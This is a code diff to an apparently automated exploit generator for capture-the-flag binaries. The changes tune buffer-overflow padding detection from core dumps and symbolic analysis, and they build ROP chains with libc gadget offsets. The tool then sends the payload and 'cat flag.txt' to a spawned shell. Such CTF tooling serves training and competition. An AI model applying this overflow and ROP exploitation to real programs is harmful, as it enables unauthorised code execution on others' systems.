@@ -45,7 +45,7 @@ context.update(
 )
 
 # Important lists to use such as useful strings, the functions we want to call in our rop chain, the calling convention, and useful rop functions with gadgets
-strings =  ["/bin/sh", "cat flag.txt", "flag.txt"]
+strings =  ["/bin/sh", "/bin/cat flag.txt", "cat flag.txt", "flag.txt"]
 exploit_functions = ["win", "system", "execve", "syscall", "print_file"]
 arg_regs = [b"rdi", b"rsi", b"rdx", b"rcx", b"r8", b"r9"]
 useful_rop_functions = ["__libc_csu_init"]
@@ -84,8 +84,8 @@ class rAEG:
     # Determine which exploit we need and return which type as a string
     # Also determine the parameters needed, and the function to execute
     def find_vulnerability(self):
-        self.core_smash()
         self.angry_analyze()
+        self.core_smash()
 
         if self.has_leak:
             logger.info(f"Found a format string vulnerability")
@@ -305,7 +305,8 @@ class rAEG:
                         continue
                     else:
                         padding += 8
-        self.padding = padding
+                self.padding = padding
+                print(self.padding)
 
 
     def find_goal(self, function_name):
@@ -564,16 +565,20 @@ class rAEG:
         #logger.info(f"Found /bin/sh address in libc {hex(u64(bin_sh))}")
 
 
-        self.padding = 248
         #padding_len = 152
         #padding_len = 88
         #padding_len = 216
 
+        # If there is no symbolic padding then using core dump
         if self.symbolic_padding == None:
-            if self.padding != None:
-               chain = b"A" * self.padding
+            chain = b"A" * self.padding
         else:
-            chain = self.symbolic_padding
+            # Prefer to use symbolic padding if it is the same as the core dump
+            if len(self.symbolic_padding) == self.padding:
+                chain = self.symbolic_padding
+            # If it is not the same then use the core dump
+            else:
+                chain = b"A" * self.padding
 
         chain += p64(self.libc.address + 0x4f302)
         chain += p64(0) * 100
@@ -839,8 +844,8 @@ class rAEG:
         p = self.start_process()
 
 
-        if self.symbolic_padding != None:
-            if self.rop_chain != None:
+        if self.rop_chain != None:
+            if self.symbolic_padding != None:
                 logger.info("Sending ROP Chain")
                 p.sendline(self.symbolic_padding + self.rop_chain)
                 p.sendline(b"cat flag.txt")
@@ -851,12 +856,27 @@ class rAEG:
                     print(self.flag)
                 except:
                     logger.info("ROP chain exploit failed")
+            else:
+                logger.info("Sending ROP Chain")
+                p.sendline(b"A" * self.padding + self.rop_chain)
+                p.sendline(b"cat flag.txt")
+                p.sendline(b"cat flag.txt")
+                try:
+                    output = p.recvall(timeout=1).decode()
+                    self.flag = "flag{" + output.split("{")[1].split("}")[0] + "}"
+                    print(self.flag)
+                except:
+                    logger.info("ROP chain exploit failed")
+
 
         # Assume that its a format challenge either format write or format leak
         else:
             # Insert leak stack function here
             if self.flag != None:
                 print(self.flag)
+            # If there is a buffer overflow and no symbolic padding
+
+
 
 
 
